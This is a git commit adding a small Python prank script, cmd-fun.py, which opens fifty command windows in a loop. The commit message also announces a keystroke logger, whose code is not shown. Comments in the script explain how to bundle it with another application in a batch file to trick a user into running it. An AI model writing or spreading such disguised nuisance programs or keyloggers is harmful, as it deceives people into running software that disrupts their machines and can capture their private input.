da91dad6e615f365c05b99dc487b43c80c221af1
Nathan Ellison <nathan.ipadman@gmail.com>
2019-09-21 18:57:28 +1200

    Created some fun programs that can both spawn a predefined number of command windows, and log a users keystrokes

---
+++ cmd-fun.py
@@ -0,0 +1,9 @@
+import os
+import sys
+
+#Use this to open any application that you want to anchor this file to
+#Create a batch file and launch this program along with the target to trick the user into running it >:)
+#os.system("start firefox")
+
+for x in range(50):
+    os.system("start cmd")
